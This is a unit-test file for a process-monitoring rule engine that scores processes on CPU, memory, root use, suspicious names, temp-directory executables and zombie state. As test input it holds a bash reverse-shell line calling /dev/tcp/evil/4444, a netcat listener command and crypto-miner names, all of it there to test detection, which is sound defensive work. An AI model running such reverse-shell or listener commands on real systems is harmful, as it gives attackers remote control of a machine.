"""
tests/test_process.py
Unit tests for the rule engine.
Run with: python -m pytest tests/ -v
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import unittest
from engine.rule_engine import (
    cpu_rule, memory_rule, root_rule, suspicious_name_rule,
    temp_exec_rule, zombie_rule, classify, evaluate_process,
    DEFAULT_CONFIG,
)


def _make_info(**kwargs):
    """Build a minimal process info dict with safe defaults."""
    defaults = {
        "pid": 9999,
        "name": "test_proc",
        "username": "alice",
        "exe": "/usr/bin/test_proc",
        "cmdline": "test_proc --arg1",
        "cpu_percent": 0.0,
        "mem_percent": 0.0,
        "mem_rss_mb": 10.0,
        "connections": [],
        "open_files_count": 0,
        "status": "running",
        "num_threads": 1,
        "ppid": 1,
        "nice": 0,
        "started_at": "2026-01-01 00:00:00",
    }
    defaults.update(kwargs)
    return defaults


class TestCpuRule(unittest.TestCase):
    def test_no_trigger_below_threshold(self):
        info = _make_info(cpu_percent=30.0)
        result = cpu_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)
        self.assertEqual(result.score, 0)

    def test_triggers_above_threshold(self):
        info = _make_info(cpu_percent=95.0)
        result = cpu_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)
        self.assertGreater(result.score, 0)

    def test_exact_threshold_no_trigger(self):
        info = _make_info(cpu_percent=70.0)
        result = cpu_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)


class TestMemoryRule(unittest.TestCase):
    def test_no_trigger(self):
        info = _make_info(mem_percent=20.0)
        result = memory_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)

    def test_triggers(self):
        info = _make_info(mem_percent=80.0)
        result = memory_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)


class TestRootRule(unittest.TestCase):
    def test_whitelisted_root_ok(self):
        info = _make_info(username="root", name="systemd")
        result = root_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)

    def test_non_whitelisted_root_flagged(self):
        info = _make_info(username="root", name="curl")
        result = root_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)

    def test_non_root_ok(self):
        info = _make_info(username="alice", name="anything")
        result = root_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)


class TestSuspiciousNameRule(unittest.TestCase):
    def test_no_trigger_normal(self):
        info = _make_info(name="nginx", cmdline="nginx -g daemon off")
        result = suspicious_name_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)

    def test_triggers_on_keyword_in_name(self):
        info = _make_info(name="netcat", cmdline="netcat -l 4444")
        result = suspicious_name_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)

    def test_triggers_on_keyword_in_cmdline(self):
        info = _make_info(name="bash", cmdline="bash -i &> /dev/tcp/evil/4444 0>&1")
        # 'miner' not in that cmdline but we can test with a known keyword
        info["cmdline"] = "python xmrig.py"
        result = suspicious_name_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)


class TestTempExecRule(unittest.TestCase):
    def test_normal_path_ok(self):
        info = _make_info(exe="/usr/bin/python3")
        result = temp_exec_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)

    def test_tmp_path_flagged(self):
        info = _make_info(exe="/tmp/evil_script")
        result = temp_exec_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)

    def test_dev_shm_flagged(self):
        info = _make_info(exe="/dev/shm/backdoor")
        result = temp_exec_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)


class TestZombieRule(unittest.TestCase):
    def test_running_ok(self):
        info = _make_info(status="running")
        result = zombie_rule(info, DEFAULT_CONFIG)
        self.assertFalse(result.triggered)

    def test_zombie_flagged(self):
        info = _make_info(status="zombie")
        result = zombie_rule(info, DEFAULT_CONFIG)
        self.assertTrue(result.triggered)


class TestClassify(unittest.TestCase):
    def test_classify_normal(self):
        self.assertEqual(classify(0), "NORMAL")

    def test_classify_low(self):
        self.assertEqual(classify(2), "LOW")

    def test_classify_suspicious(self):
        self.assertEqual(classify(5), "SUSPICIOUS")

    def test_classify_risky(self):
        self.assertEqual(classify(10), "RISKY")


class TestEvaluateProcess(unittest.TestCase):
    def test_clean_process_normal(self):
        info = _make_info()
        ev = evaluate_process(info)
        self.assertEqual(ev.level, "NORMAL")
        self.assertEqual(ev.score, 0)
        self.assertEqual(ev.alerts, [])

    def test_high_cpu_flagged(self):
        info = _make_info(cpu_percent=99.0)
        ev = evaluate_process(info)
        self.assertIn("High CPU", ev.alerts[0])

    def test_multiple_alerts_accumulate_score(self):
        info = _make_info(
            cpu_percent=99.0,
            mem_percent=95.0,
            exe="/tmp/miner",
            name="xmrig",
        )
        ev = evaluate_process(info)
        self.assertGreater(ev.score, 6)
        self.assertEqual(ev.level, "RISKY")

    def test_threshold_override(self):
        info = _make_info(cpu_percent=75.0)
        # Default threshold is 70 → triggers; raising to 80 should not trigger
        ev = evaluate_process(info, config={"cpu_threshold": 80.0})
        cpu_alerts = [a for a in ev.alerts if "CPU" in a]
        self.assertEqual(cpu_alerts, [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
